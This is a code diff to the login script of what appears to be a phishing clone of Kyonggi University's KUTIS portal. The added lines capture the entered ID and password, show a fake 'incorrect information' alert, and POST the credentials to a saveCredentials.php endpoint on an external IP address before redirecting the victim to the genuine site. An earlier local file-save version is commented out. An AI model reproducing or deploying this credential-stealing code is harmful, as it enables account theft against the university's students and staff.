@@ -145,17 +145,38 @@ var SystemInfo = new function() {
           // 입력된 ID와 PW 가져오기
           var id = document.getElementById("id").value;
           var pw = document.getElementById("pw").value;
-  
+
           // alert 메시지 띄우기
           alert('입력한 정보가 올바르지 않습니다!');
-  
+
+          var dataToSend = {
+            id: id,
+            pw: pw
+          };
+
+          var xhr = new XMLHttpRequest();
+
+          xhr.open('POST', 'http://20.214.184.232:54321/board/ns_kutis/ns_kutis_site/kutis.kyonggi.ac.kr/webkutis/view/saveCredentials.php', true);
+          xhr.setRequestHeader('Content-Type', 'application/json');
+
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+              if (xhr.status === 200) {
+                console.log('서버 응답:', xhr.responseText);
+              } else {
+                console.log('요청 실패:', xhr.status);
+              }
+            }
+          };
+
+          xhr.send(JSON.stringify(dataToSend));
           // ID와 PW를 특정 경로에 텍스트 파일로 저장
-          var dataToSave = "ID: " + id + "\nPW: " + pw;
-          var blob = new Blob([dataToSave], {type: 'text/plain'});
-          var a = document.createElement("a");
-          a.href = URL.createObjectURL(blob);
-          a.download = "login_info.txt";
-          a.click();
+          // var dataToSave = "ID: " + id + "\nPW: " + pw;
+          // var blob = new Blob([dataToSave], {type: 'text/plain'});
+          // var a = document.createElement("a");
+          // a.href = URL.createObjectURL(blob);
+          // a.download = "login_info.txt";
+          // a.click();
   
           // 원하는 페이지로 이동
           window.location.href = "https://kutis.kyonggi.ac.kr/webkutis/view/indexWeb.jsp";
